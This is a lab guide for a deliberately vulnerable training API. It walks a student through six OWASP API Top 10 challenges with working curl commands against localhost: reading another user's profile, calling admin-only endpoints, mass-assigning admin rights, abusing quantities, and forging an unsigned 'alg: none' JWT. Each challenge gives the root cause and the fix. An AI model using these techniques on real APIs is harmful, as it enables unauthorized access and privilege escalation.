# STARLITE VIDEO BBS — Lab Guide

Welcome back to the BBS, operator. Six bugs are hidden in this system,
each mapped to an OWASP API Security Top 10 category. Work through them
in order, capture the "flag" (the piece of data you weren't supposed to
reach), and write down which line of code caused it.

Setup: `./start.sh`, then confirm the API is alive:

```bash
curl http://localhost:8000/api/health
```

Log in as guest and save the token for the rest of the lab:

```bash
TOKEN=$(curl -s -X POST http://localhost:8000/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
echo $TOKEN
```

---

## Challenge 1 — BOLA (Broken Object Level Authorization)

**Goal:** As `guest` (user id 1), read `admin`'s private profile (user id 2)
and recover their balance and email.

```bash
curl -s http://localhost:8000/api/v1/users/2 -H "Authorization: Bearer $TOKEN"
```

**Flag:** admin's `balance` field.
**Root cause:** `GET /api/v1/users/{user_id}` in `app/main.py` loads
whatever `user_id` is in the URL and never checks it against
`auth["sub"]` (the id embedded in the caller's own token).
**Fix:** `if int(auth["sub"]) != user_id and not auth["is_admin"]: raise 403`.

---

## Challenge 2 — BFLA (Broken Function Level Authorization)

**Goal:** As `guest`, call an admin-only function.

```bash
curl -s http://localhost:8000/api/v1/admin/users -H "Authorization: Bearer $TOKEN"
```

Then go further — delete a user you shouldn't be able to:

```bash
curl -s -X DELETE http://localhost:8000/api/v1/admin/users/2 -H "Authorization: Bearer $TOKEN"
```

**Flag:** the full user list, then a successful delete.
**Root cause:** `admin_list_users` / `admin_delete_user` depend on
`get_current_user` only, which just proves the token decodes — it never
checks `auth["is_admin"]`.
**Fix:** add a `require_admin` dependency that raises 403 when
`is_admin` is falsy.

---

## Challenge 3 — BOPLA (Broken Object Property Level Auth / excessive data)

**Goal:** Bypass the intended small page size on the catalog and pull
every row in one request.

```bash
curl -s "http://localhost:8000/api/v1/movies?limit=9999" | python3 -m json.tool | head -40
```

**Flag:** all 15 movies in a single response.
**Root cause:** `list_movies(limit: int = 50)` passes the client-supplied
`limit` straight into `.limit(limit)` with no server-side ceiling.
**Fix:** clamp with `limit = min(limit, 20)` server-side, ignore the
client's number past that cap.

---

## Challenge 4 — Mass Assignment

**Goal:** As `guest`, promote yourself to admin and give yourself money,
using the same `PUT /users/{id}` endpoint meant only for editing your
email.

```bash
curl -s -X PUT http://localhost:8000/api/v1/users/1 \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"is_admin": true, "balance": 999999}'
```

Confirm it stuck:

```bash
curl -s http://localhost:8000/api/v1/users/1 -H "Authorization: Bearer $TOKEN"
```

**Flag:** `is_admin: true`, `balance: 999999` on your own account.
**Root cause:** `update_user` applies every field in the request body
with `setattr`, including `is_admin` and `balance`, which should never
be client-writable.
**Fix:** define an allowlist (e.g. only `email`) and ignore/reject
everything else.

---

## Challenge 5 — Unrestricted Resource Consumption

**Goal:** "Rent" a nearly unlimited number of VHS copies, or order an
absurd quantity of snacks, with no cap and no real balance check.

```bash
curl -s -X POST http://localhost:8000/api/v1/rentals \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"movie_id": 1, "qty": 999999}'

curl -s -X POST http://localhost:8000/api/v1/snacks/order \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"snack_id": 1, "qty": 999999}'
```

**Flag:** a rental/order response showing `qty: 999999` succeeding for a
user with only $5 balance.
**Root cause:** neither endpoint validates `qty` against stock or the
user's balance, nor caps it to a sane maximum.
**Fix:** enforce `0 < qty <= stock`, check `user.balance >= total_price`,
and deduct atomically.

---

## Challenge 6 — Forged JWT (`alg: none`)

**Goal:** Without ever logging in as admin, forge a token claiming to be
admin (user id 2), and use it against the BFLA endpoint from Challenge 2.

```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"sub":"2","username":"admin","is_admin":true}' | base64 | tr -d '=' | tr '/+' '_-')
FORGED="$HEADER.$PAYLOAD."

curl -s http://localhost:8000/api/v1/admin/users -H "Authorization: Bearer $FORGED"
```

**Flag:** the admin user list, reached with a token nobody signed.
**Root cause:** `auth.py`'s `decode_token` passes
`algorithms=["HS256", "none"]` to `jwt.decode`, so a token with
`alg: none` and an empty signature is accepted as valid. The secret
(`starlite1985`) is also weak enough to brute-force offline if `none`
weren't available.
**Fix:** only allow `["HS256"]`, and use a long random secret (or switch
to RS256 with a real key pair) pulled from an actual secrets store, not
a hardcoded string.

---

## Wrap-up

For each challenge, write a one-paragraph remediation note: which line
of code was wrong, what the correct check looks like, and which OWASP
API Top 10 category it maps to. Re-run `docker compose down -v &&
./start.sh` to reset the lab to its seeded state before handing it to
the next student.
